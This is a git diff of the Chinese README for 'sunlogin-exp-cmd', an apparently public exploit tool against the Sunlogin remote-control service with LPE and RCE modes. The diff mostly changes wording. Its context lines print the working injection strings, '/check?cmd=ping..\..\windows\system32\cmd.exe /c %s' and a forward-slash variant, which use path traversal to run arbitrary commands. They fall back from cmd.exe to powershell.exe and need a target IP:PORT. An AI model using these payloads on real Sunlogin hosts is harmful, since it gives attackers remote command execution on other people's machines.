@@ -11,7 +11,7 @@ GUI版本：[https://github.com/theLSA/sunlogin-exp-gui](https://github.com/theL
 
 ![](https://github.com/theLSA/sunlogin-exp-cmd/raw/master/demo/sunlogin-exp-cmd-00.png)
 
-lpe模式：
+LPE模式：
 
 获取端口方式的顺序：
 
@@ -25,7 +25,7 @@ lpe模式：
 
 5.tasklist查找SunloginService进程
 
-接着用两种exp执行命令：
+接着执行命令：先用cmd.exe，若失败则用powershell.exe。
 
 string rceFormatString = "/check?cmd=ping..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\system32\\\\cmd.exe /c %s";
 
@@ -33,9 +33,9 @@ string rceFormat1String = "/check?cmd=ping../../../../../../../../../windows/sys
 
 ![](https://github.com/theLSA/sunlogin-exp-cmd/raw/master/demo/sunlogin-exp-cmd-01.png)
 
-rce模式：
+RCE模式：
 
-调用lpe模式的两个exp，须要指定IP:PORT。
+先用cmd.exe，若失败则用powershell.exe，须指定IP:PORT。
 
 ![](https://github.com/theLSA/sunlogin-exp-cmd/raw/master/demo/sunlogin-exp-cmd-02.png)
 
